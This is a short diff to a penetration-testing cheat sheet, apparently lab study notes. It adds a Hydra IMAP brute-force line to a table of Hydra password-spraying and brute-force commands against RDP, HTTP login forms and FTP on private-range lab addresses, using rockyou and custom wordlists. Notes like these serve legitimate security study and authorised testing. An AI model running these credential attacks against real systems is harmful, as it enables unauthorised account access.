@@ -5,6 +5,7 @@
 | `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202` | RDP - Password spraying |
 | `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` | HTTP Form |
 | `hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.213.61` | FTP |
+| `hydra -L users.txt -P cewl-list.txt -f 192.168.235.137 imap -u -f` | IMAP |
 
 #### Hash cracking
 
